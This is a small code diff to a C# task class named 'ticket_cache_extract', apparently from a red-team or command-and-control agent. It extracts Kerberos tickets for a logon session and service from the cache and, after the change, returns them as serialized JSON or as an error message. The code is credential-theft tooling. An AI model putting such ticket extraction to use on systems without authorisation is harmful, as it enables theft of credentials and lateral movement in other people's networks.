@@ -40,9 +40,15 @@ public class ticket_cache_extract : Tasking
         string service = parameters.service;
         try
         {
-            var ticket = _agent.GetTicketManager().ExtractTicketFromCache(luid, service);
-            _agent.GetTicketManager().AddTicketToTicketStore(new(ticket));
-            resp = CreateTaskResponse($"Extracted Ticket for service {service}: \n {KerberosTicketDataDTO.CreateFromKerberosTicket(ticket,luid).ToString().ToIndentedString()}", true);
+            var (ticket, errorMsg) = _agent.GetTicketManager().ExtractTicketFromCache(luid, service);
+            if (ticket != null)
+            {
+                resp = CreateTaskResponse(_jsonSerializer.Serialize(new KerberosTicketStoreDTO(ticket)), true);
+            } else
+            {
+                resp = CreateTaskResponse(errorMsg, true, "error");
+            }
+
         }
         catch (Exception e)
         {
